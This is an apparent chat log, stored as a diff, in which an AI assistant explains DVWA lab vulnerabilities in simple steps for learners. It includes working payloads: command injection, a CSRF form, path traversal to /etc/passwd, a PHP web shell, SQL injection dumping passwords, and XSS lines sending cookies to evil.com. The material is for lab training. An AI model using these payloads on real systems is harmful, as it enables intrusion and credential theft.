@@ -1,0 +1,507 @@
+To view keyboard shortcuts, press question mark
+
+View keyboard shortcuts
+
+
+I'm doing pentesting on dvwa web application, give me name of all the vulnerabilities and their steps to reproduce so that even 5th class can understand it in points for eachone
+
+
+Damn Vulnerable Web Application (DVWA) is a tool designed to help learn about web vulnerabilities in a safe environment. Below, I’ll list the main vulnerabilities in DVWA and explain how to reproduce them in simple, step-by-step points that even a young student can understand. Each vulnerability will have its name, a brief explanation, and clear steps to try it out. I’ll assume you have DVWA set up on a local machine (like Kali Linux or a virtual machine) and are using the default credentials (username: admin, password: password). Always set the security level to Low in DVWA for these exercises, as it’s the easiest for beginners.
+
+Important Note: Only practice these on DVWA or other legal test environments. Never try these on real websites without permission, as it’s illegal.
+
+1. Brute Force
+
+What is it?: Guessing a password by trying many combinations until you get the right one.
+
+Steps to Reproduce:
+
+Go to the “Brute Force” section in DVWA’s left menu.
+
+
+
+You’ll see a login page with username and password fields.
+
+
+
+Type a username like “admin” and a random password like “abc”.
+
+
+
+Click “Login”. It will say “Login failed”.
+
+
+
+Instead of guessing manually, use a tool like Burp Suite:
+
+Open Burp Suite and turn on “Intercept”.
+
+
+
+Go back to DVWA, try logging in again, and Burp will capture the request.
+
+
+
+Send the captured request to Burp’s “Intruder” tool.
+
+
+
+In Intruder, highlight the password part and load a list of common passwords (like “password”, “123456”).
+
+
+
+Start the attack. Burp will try each password until it finds the correct one (it’s “password” for admin).
+
+
+You’re in! This shows how weak passwords can be guessed.
+
+
+2. Command Injection
+
+What is it?: Tricking a website into running commands on the server, like listing files.
+
+Steps to Reproduce:
+
+Go to the “Command Injection” section in DVWA.
+
+
+
+You’ll see a box to enter an IP address to ping.
+
+
+
+Type a normal IP like “127.0.0.1” and click “Submit”. It shows ping results.
+
+
+
+Now, try adding a bad command. Type: 127.0.0.1; ls (the “;” lets you add another command, “ls” lists files).
+
+
+
+Click “Submit”. You’ll see the ping results and a list of files on the server!
+
+
+
+Try another command like 127.0.0.1; whoami to see the server’s username.
+
+
+
+This shows how a website can be tricked into running harmful commands.
+
+
+3. Cross-Site Request Forgery (CSRF)
+
+What is it?: Tricking a user into doing something on a website without knowing, like changing their password.
+
+Steps to Reproduce:
+
+Go to the “CSRF” section in DVWA.
+
+
+
+You’ll see a form to change your password.
+
+
+
+Type a new password like “hacked” and confirm it.
+
+
+
+Click “Change”. The password changes for the user.
+
+
+
+Now, imagine tricking someone. Create a fake webpage with this HTML code (save it as trick.html):
+
+html
+
+
+<form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="hacked">
+  <input type="hidden" name="password_conf" value="hacked">
+  <input type="submit" value="Click Me!">
+</form>
+
+
+Open trick.html in a browser while logged into DVWA.
+
+
+
+Click the “Click Me!” button. It changes the DVWA password to “hacked” without you visiting the DVWA page!
+
+
+
+This shows how a fake link can trick users into actions.
+
+
+4. File Inclusion
+
+What is it?: Making a website show files it shouldn’t, like secret server files.
+
+Steps to Reproduce:
+
+Go to the “File Inclusion” section in DVWA.
+
+
+
+You’ll see links like “page=include.php”. Click one to see a normal page.
+
+
+
+In the URL, change “include.php” to ../../../etc/passwd (this is a secret Linux file).
+Example: http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../etc/passwd
+
+
+
+Press Enter. You’ll see the contents of the passwd file, which lists server users!
+
+
+
+This works because the website doesn’t check what file you’re asking for.
+
+
+
+Try another file like /etc/hosts to see more server info.
+
+
+
+This shows how attackers can access hidden files.
+
+
+5. File Upload
+
+What is it?: Uploading a harmful file (like a virus) to a website to control it.
+
+Steps to Reproduce:
+
+Go to the “File Upload” section in DVWA.
+
+
+
+You’ll see a button to upload a file.
+
+
+
+Create a simple harmful file. Open a text editor and write:
+
+php
+
+
+<?php echo system($_GET['cmd']); ?>
+
+
+Save it as bad.php.
+
+
+
+In DVWA, click “Choose File”, select bad.php, and click “Upload”.
+
+
+
+If it says “File uploaded”, it will show a link like ../../hackable/uploads/bad.php.
+
+
+
+Click the link or go to http://127.0.0.1/dvwa/hackable/uploads/bad.php?cmd=ls.
+
+
+
+It will list server files! Try ?cmd=whoami to see the server user.
+
+
+
+This shows how attackers can upload files to run bad commands.
+
+
+6. SQL Injection
+
+What is it?: Tricking a website’s database to show secret info, like user passwords.
+
+Steps to Reproduce:
+
+Go to the “SQL Injection” section in DVWA.
+
+
+
+You’ll see a box to enter a “User ID”.
+
+
+
+Type 1 and click “Submit”. It shows info about user ID 1.
+
+
+
+Now, try a trick. Type: 1' OR '1'='1 (the single quotes confuse the database).
+
+
+
+Click “Submit”. It shows all users in the database!
+
+
+
+Try another trick: 1' UNION SELECT user,password FROM users #
+
+
+
+This shows usernames and passwords from the database.
+
+
+
+This happens because the website doesn’t check your input, letting you mess with the database.
+
+
+7. Cross-Site Scripting (XSS) - Reflected
+
+What is it?: Making a website show a bad script that can steal user info (like cookies).
+
+Steps to Reproduce:
+
+Go to the “XSS (Reflected)” section in DVWA.
+
+
+
+You’ll see a box to enter your name.
+
+
+
+Type Hello and click “Submit”. It says “Hello, Hello”.
+
+
+
+Now, type a script: <script>alert('Hacked!')</script>
+
+
+
+Click “Submit”. A pop-up says “Hacked!”.
+
+
+
+Try a worse script: <script>document.location='http://evil.com?cookie='+document.cookie</script>
+
+
+
+If it runs, it could send the user’s cookie to a bad website (don’t use a real evil.com).
+
+
+
+This shows how attackers can run scripts on a user’s browser.
+
+
+8. Cross-Site Scripting (XSS) - Stored
+
+What is it?: Saving a bad script on a website so it runs for everyone who visits.
+
+Steps to Reproduce:
+
+Go to the “XSS (Stored)” section in DVWA.
+
+
+
+You’ll see a guestbook with “Name” and “Message” boxes.
+
+
+
+In “Name”, type Test. In “Message”, type <script>alert('Hacked!')</script>.
+
+
+
+Click “Sign Guestbook”. The page reloads, and a pop-up says “Hacked!”.
+
+
+
+Every time someone visits this page, the pop-up appears!
+
+
+
+Try a worse script: <script>document.location='http://evil.com?cookie='+document.cookie</script>
+
+
+
+This could steal cookies from anyone who visits (don’t use a real evil.com).
+
+
+
+This shows how a script can harm all visitors.
+
+
+9. Cross-Site Scripting (XSS) - DOM
+
+What is it?: Changing a website’s code in the browser to run a bad script.
+
+Steps to Reproduce:
+
+Go to the “XSS (DOM)” section in DVWA.
+
+
+
+You’ll see a dropdown to pick a language (like “English”).
+
+
+
+In the URL, it says ?default=English. Change it to ?default=<script>alert('Hacked!')</script>.
+
+
+
+Press Enter. A pop-up says “Hacked!”.
+
+
+
+Try a worse script: ?default=<script>document.location='http://evil.com?cookie='+document.cookie</script>
+
+
+
+If it runs, it could steal the user’s cookie (don’t use a real evil.com).
+
+
+
+This shows how attackers can mess with a website’s code in the browser.
+
+
+10. Insecure CAPTCHA
+
+What is it?: Bypassing a CAPTCHA (like “I’m not a robot”) to do bad things.
+
+Steps to Reproduce:
+
+Go to the “Insecure CAPTCHA” section in DVWA.
+
+
+
+You’ll see a form to change a password with a CAPTCHA.
+
+
+
+Type a new password like “hacked” and solve the CAPTCHA.
+
+
+
+Before clicking “Change”, open your browser’s “Inspect Element” (right-click, select “Inspect”).
+
+
+
+Find the CAPTCHA code (like g-recaptcha-response).
+
+
+
+Remove the CAPTCHA check by deleting its code or changing it to “true”.
+
+
+
+Click “Change”. The password changes without a real CAPTCHA!
+
+
+
+This shows how weak CAPTCHAs can be bypassed.
+
+
+11. Security Misconfiguration
+
+What is it?: Finding mistakes in how a website is set up, like open directories.
+
+Steps to Reproduce:
+
+DVWA doesn’t have a specific “Security Misconfiguration” section, but you can explore.
+
+
+
+In your browser, go to http://127.0.0.1/dvwa/hackable/.
+
+
+
+If it shows a list of files (like “uploads”), the server is misconfigured!
+
+
+
+Click on files to see if they reveal secrets (like uploaded files from “File Upload”).
+
+
+
+Try other URLs like http://127.0.0.1/dvwa/config/ to see if config files are exposed.
+
+
+
+If you find sensitive info, it’s a misconfiguration.
+
+
+
+This shows how bad setup can leak secrets.
+
+
+Summary of Vulnerabilities:
+
+Brute Force: Guess passwords with tools.
+
+
+
+Command Injection: Run server commands.
+
+
+
+CSRF: Trick users into actions.
+
+
+
+File Inclusion: Show secret files.
+
+
+
+File Upload: Upload harmful files.
+
+
+
+SQL Injection: Mess with the database.
+
+
+
+XSS (Reflected): Run scripts in user input.
+
+
+
+XSS (Stored): Save scripts for all users.
+
+
+
+XSS (DOM): Change browser code.
+
+
+
+Insecure CAPTCHA: Bypass robot checks.
+
+
+
+Security Misconfiguration: Find setup mistakes.
+
+
+Tips for Learning:
+
+Always use the “View Source” and “View Help” buttons in DVWA for hints.
+
+
+
+Practice on “Low” security first, then try “Medium” and “High”.
+
+
+
+Use tools like Burp Suite or OWASP ZAP to make tasks easier.
+
+
+
+Never test on real websites without permission.
+
+
+If you need help setting up DVWA or want more details on any vulnerability, let me know
+
+
+3 posts
+
+
+15 web pages
+
+
+Generate me same for all the below vulnerability from dvwa web app pocket
+Brute ForceCommand InjectionCSRFFile InclusionFile UploadInsecure CAPTCHASql InjectionSql Injection (Blind)Weak Session IDsXSS (DOM)XSS (Reflected)XSS (Stored)CSP BypassJavascriptAuthorisation BypassOpen HTTP RedirectCryptographyAPI
+
+
+Something went wrong, please refresh to reconnect or try again.
+
+
